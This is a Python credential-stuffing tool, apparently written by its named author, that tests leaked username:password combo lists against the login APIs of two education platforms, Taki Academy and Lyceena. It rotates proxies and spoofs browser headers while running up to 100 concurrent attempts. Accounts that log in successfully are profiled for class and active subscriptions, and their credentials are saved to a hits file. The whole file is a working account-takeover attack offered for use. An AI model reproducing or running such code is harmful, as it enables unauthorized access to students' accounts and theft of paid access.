import httpx
import random
import asyncio
import os
import sys
from colorama import Fore, init
import datetime
from pathlib import Path
from urllib.parse import quote
import time

init(autoreset=True)

stop_event = asyncio.Event()
TOKEN_EVENT = asyncio.Event()
LOCK = asyncio.Lock()
COMBOS = asyncio.Queue()
PROXIES = []


checked = 0
hits = 0


hits_filename = Path("hits").joinpath(
    datetime.datetime.now().strftime(f"%d-%m-%Y %H;%M;%S") + ".txt"
)


async def taki_thread(PROXIES: list, COMBOS: asyncio.Queue, debug: bool):

    global checked, hits
    while True:
        try:
            combo = COMBOS.get_nowait()  # non-blocking
        except asyncio.QueueEmpty:
            return  # return if queue is empty
        try:
            username, password = combo.split(":", 1)
        except Exception:
            print(Fore.RED + f"[FAIL] {combo} | bad combo format")
            async with LOCK:
                checked += 1
            COMBOS.task_done()
            continue
        proxy_url = None
        if PROXIES:
            proxy_url = build_proxies(random.choice(PROXIES))

        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Origin": "https://app.takiacademy.com",
            "Referer": "https://app.takiacademy.com/",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en,ar;q=0.9",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Priority": "u=1, i",
            "Sec-Ch-Ua": '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
        }

        while True:  # retry loop
            try:

                async with httpx.AsyncClient(
                    proxy=proxy_url, timeout=30, verify=False, headers=headers
                ) as client:

                    payload = {
                        "username": username,
                        "password": password,
                        "g-recaptcha-response": "",
                    }
                    try:
                        result = await client.post(
                            "https://api.takiacademy.com/api/auth/login_check",
                            headers=headers,
                            json=payload,
                        )
                        raw = safe_json(result)
                        if not raw:
                            print(Fore.RED + "[!] Token Not Found Error !")
                            async with LOCK:
                                checked += 1
                            break
                        if raw["message"] == "Authentication Success":
                            token = raw.get("payload", {}).get("token")
                            if not token:
                                async with LOCK:
                                    checked += 1
                                continue
                            headers = {
                                "Content-Type": "application/json",
                                "Accept": "application/json",
                                "Origin": "https://app.takiacademy.com",
                                "Referer": "https://app.takiacademy.com/",
                                "Accept-Encoding": "gzip, deflate, br, zstd",
                                "Accept-Language": "en,ar;q=0.9",
                                "Sec-Ch-Ua-Platform": '"Windows"',
                                "Priority": "u=1, i",
                                "Sec-Ch-Ua": '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
                                "Sec-Fetch-Dest": "empty",
                                "Sec-Fetch-Mode": "cors",
                                "Sec-Fetch-Site": "same-site",
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
                                "Authorization": f"Bearer {token}",
                            }
                            res = await client.get(
                                "https://api.takiacademy.com/api/auth/me",
                                headers=headers,
                            )
                            raw = safe_json(res)
                            if not raw:
                                async with LOCK:
                                    checked += 1
                                continue
                            affiliations = []
                            user_info = raw.get("payload", {}).get("user", {})

                            optional_subject = (
                                user_info.get("optional_subject") or {}
                            ).get("name", "No subject")
                            classe = (user_info.get("division") or {}).get(
                                "name", "No classe"
                            )

                            affiliations = []
                            active = False
                            for x in user_info.get("affiliations") or []:
                                if x.get("active") or False:
                                    active = True
                                    affiliations.append(
                                        x.get("group", {}).get(
                                            "name", "No subscription Name"
                                        )
                                    )
                                    break

                            if active:
                                if debug:
                                    print(
                                        Fore.GREEN
                                        + f"[+] login successful with {combo}  !"
                                    )
                                else:
                                    print(Fore.GREEN + "[+] login successful  !")
                                save_hit(
                                    username,
                                    password,
                                    classe,
                                    optional_subject,
                                    affiliations,
                                )
                                async with LOCK:
                                    hits += 1
                            else:
                                if debug:
                                    print(
                                        Fore.YELLOW
                                        + f"[!] not an active user with {combo}  !"
                                    )
                                else:
                                    print(Fore.YELLOW + "[+] user not active   !")
                        elif debug:
                            print(Fore.RED + f"[!] login failed with {combo}  !")
                            break
                        break
                    except httpx.RequestError:
                        print(Fore.RED + f"[FAIL] {combo} [retrying... in 1s]")
                        await asyncio.sleep(1)
                        continue
                    finally:
                        async with LOCK:
                            checked += 1
                        COMBOS.task_done()
            except httpx.ProxyError as e:
                print(Fore.RED + f"[!] Proxy error: {e}")
                break


async def lycena_thread(PROXIES: list, COMBOS: asyncio.Queue, debug: bool):
    global checked, hits
    while True:
        try:
            combo = COMBOS.get_nowait()  # non-blocking
        except asyncio.QueueEmpty:
            return  # return if queue is empty
        try:
            username, password = combo.split(":", 1)
        except Exception:
            print(Fore.RED + f"[FAIL] {combo} | bad combo format")
            async with LOCK:
                checked += 1
            COMBOS.task_done()
            continue

        proxy_url = None
        if PROXIES:
            proxy_url = build_proxies(random.choice(PROXIES))

        headers = {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Origin": "https://student.lyceena.tn",
        }


        try:

            async with httpx.AsyncClient(
                proxy=proxy_url, timeout=30, verify=False, headers=headers
            ) as client:

                payload = {
                    "returnSecureToken": True,
                    "email": username,
                    "password": password,
                    "clientType": "CLIENT_TYPE_WEB",
                }

                result = await client.post(
                    "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyAI6_GRBwYVq93IQO33cIuaTaev7XOYgMY",
                    headers=headers,
                    json=payload,
                )
                raw = safe_json(result)
                if not raw:
                    print(Fore.RED + "[!] Token Not Found Error !")
                    # async with LOCK:
                    #     checked += 1
                    return
                token = raw["idToken"] or ""
                if token:
                    
                    headers["Authorization"] = f"Bearer {token}"
                    res = await client.get(
                        "https://api-back.lyceena.tn/api/users/getMyCourses",
                        headers=headers,
                    )
                    raw = safe_json(res)
                    if not raw:
                        async with LOCK:
                            checked += 1
                        return
                    affiliations = [""]
                    user_info = raw.get("studentFound", {})
                    
                    optional_subject = user_info.get("option", "No subject")

                    classe = user_info.get(
                        "niveau", "No classe"
                    ) + " " + user_info.get("branche", "")

                    # affiliations = []
                    # active = False
                    # for x in user_info.get("affiliations") or []:
                    #     if x.get("active") or False:
                    #         active = True
                    #         affiliations.append(
                    #             x.get("group", {}).get(
                    #                 "name", "No subscription Name"
                    #             )
                    #         )
                    #         break

                    active = True

                    if active:
                        if debug:
                            print(
                                Fore.GREEN
                                + f"[+] login successful with {combo}  !"
                            )
                        else:
                            print(Fore.GREEN + "[+] login successful  !")
                        save_hit(
                            username,
                            password,
                            classe,
                            optional_subject,
                            affiliations,
                        )
                        async with LOCK:
                            hits += 1
                    else:
                        if debug:
                            print(
                                Fore.YELLOW
                                + f"[!] not an active user with {combo}  !"
                            )
                        else:
                            print(Fore.YELLOW + "[+] user not active   !")
                elif debug:
                    print(Fore.RED + f"[!] login failed with {combo}  !")
                    return
        except httpx.RequestError as e:
            print(Fore.RED + f"[FAIL] Request error: {e}")
        finally:
            async with LOCK:
                checked += 1
            COMBOS.task_done()


def save_hit(username, password, classe, optional_subject, affiliations):
    subs = " / ".join(affiliations or [])
    with open(hits_filename, "a", encoding="utf-8") as f:
        f.write(
            f"{username}:{password}      |  classe: '{classe}'   |  subject: '{optional_subject}' | subsriptions: {subs} \n"
        )


def safe_json(res) -> str | None:
    try:
        return res.json()
    except Exception:
        return None


def build_proxies(proxy: str):
    """
    Normalize one proxy string for httpx.
    Supports:
      - ip:port
      - ip:port:user:pass
      - user:pass@ip:port
      - http://ip:port, socks4://ip:port, socks5://ip:port, etc.
    Returns:
      a string usable by httpx.AsyncClient(proxy=...)
      or None if invalid.
    """
    if not proxy or not isinstance(proxy, str):
        return None

    s = proxy.strip()

    # Already has full scheme
    if s.lower().startswith(
        ("http://", "https://", "socks4://", "socks5://", "socks://")
    ):
        return s  # just return the string

    def pick_scheme(host: str, port: str | None):
        if (
            port in ("1080", "9050")
            or "socks" in host.lower()
            or host.lower().startswith("tor")
        ):
            return "socks5"
        return "http"

    # user:pass@ip:port
    if "@" in s:
        userinfo, hostpart = s.rsplit("@", 1)
        if ":" in hostpart:
            host, port = hostpart.rsplit(":", 1)
        else:
            host, port = hostpart, None
        scheme = pick_scheme(host, port)
        if ":" in userinfo:
            user, pwd = userinfo.split(":", 1)
            return f"{scheme}://{quote(user)}:{quote(pwd)}@{host}:{port}"
        else:
            return f"{scheme}://{quote(userinfo)}@{host}:{port}"

    # ip:port:user:pass
    parts = s.rsplit(":", 3)
    if len(parts) == 4:
        host, port, user, pwd = parts
        scheme = pick_scheme(host, port)
        return f"{scheme}://{quote(user)}:{quote(pwd)}@{host}:{port}"

    # ip:port
    if len(parts) == 2:
        host, port = parts
        scheme = pick_scheme(host, port)
        return f"{scheme}://{host}:{port}"

    return None


async def main():
    global PROXIES, COMBOS

    print(
        r"""
    _        _______ _________ _______           _______  _______  _        _______  _______ 
    ( (    /|(  ____ \\__   __/(  ____ \|\     /|(  ____ \(  ____ \| \    /\(  ____ \(  ____ )
    |  \  ( || (    \/   ) (   | (    \/| )   ( || (    \/| (    \/|  \  / /| (    \/| (    )|
    |   \ | || (__       | |   | |      | (___) || (__    | |      |  (_/ / | (__    | (____)|
    | (\ \) ||  __)      | |   | |      |  ___  ||  __)   | |      |   _ (  |  __)   |     __)
    | | \   || (         | |   | |      | (   ) || (      | |      |  ( \ \ | (      | (\ (   
    | )  \  || (____/\   | |   | (____/\| )   ( || (____/\| (____/\|  /  \ \| (____/\| ) \ \__
    |/    )_)(_______/   )_(   (_______/|/     \|(_______/(_______/|_/    \/(_______/|/   \__/
                                                                            
        taki academy [1], lycena academy [2]         (comming soon...) by ahmed mbarek


"""
    )

    if not os.path.isfile("combos.txt"):
        print(
            Fore.RED
            + f"[!] Missing combos.txt in current folder. Create it and add combos username:password per line."
        )
        sys.exit(0)

    CHECKER_TYPE = input("> ")

    while CHECKER_TYPE not in ["1", "2"]:
        print(Fore.YELLOW + "[!] command is not found !")
        CHECKER_TYPE = input("> ")
    CHECKER_TYPE = int(CHECKER_TYPE)

    use_proxies = input("[*] Use proxies? (Y/N): ").strip().upper() == "Y"

    if use_proxies:
        if os.path.isfile("proxies.txt"):
            with open("proxies.txt", "r", encoding="utf-8") as f:
                PROXIES = [line.strip() for line in f if line.strip()]
        else:
            print(
                Fore.RED + "[!] no proxies available, try adding proxies in proxies.txt"
            )
            print(
                Fore.RED + "or you can continue without a proxy so using your (IP/VPN):"
            )
            if input("[*] continue (Y/N): ").strip().upper() != "Y":
                sys.exit(1)

    if not PROXIES:
        print(Fore.YELLOW + "[+] Proxyless mode enabled (using your IP/VPN).")

    try:
        THREADS_COUNT = int(input("threads [default:100]: ") or 100)
    except:
        THREADS_COUNT = 100
    debug = input("you want to use debug mode (Y/N) : ").strip().upper() == "Y"

    with open("combos.txt", "r", encoding="utf-8") as f:
        for line in f:
            if line.strip():
                await COMBOS.put(line.strip())

    combos_size = COMBOS.qsize()

    match (CHECKER_TYPE):
        case 1:
            tasks = [
                asyncio.create_task(taki_thread(PROXIES, COMBOS, debug))
                for _ in range(THREADS_COUNT)
            ]
        case 2:
            tasks = [
                asyncio.create_task(lycena_thread(PROXIES, COMBOS, debug))
                for _ in range(THREADS_COUNT)
            ]
        case _:
            sys.exit(3)

    await COMBOS.join()

    print(Fore.CYAN + f"Done!,  Checked {checked}/{combos_size} | Hits={hits}")
    stop_event.set()


if __name__ == "__main__":
    asyncio.run(main())
    input(Fore.RED + "[-] press enter to exit > ")
